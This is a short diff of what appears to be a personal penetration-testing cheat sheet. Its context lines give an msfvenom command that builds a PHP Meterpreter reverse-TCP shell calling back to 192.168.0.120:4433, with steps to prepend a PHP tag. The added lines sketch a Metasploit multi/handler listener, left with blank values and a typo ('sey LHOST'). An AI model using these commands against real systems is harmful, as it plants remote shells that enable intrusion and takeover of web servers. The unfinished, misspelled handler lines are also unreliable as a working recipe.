@@ -9,3 +9,8 @@
 # php rev
 msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.0.120 LPORT=4433 -f raw > shell.php
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+
+use exploit/multi/handler
+set payload 
+sey LHOST
+set LPORT
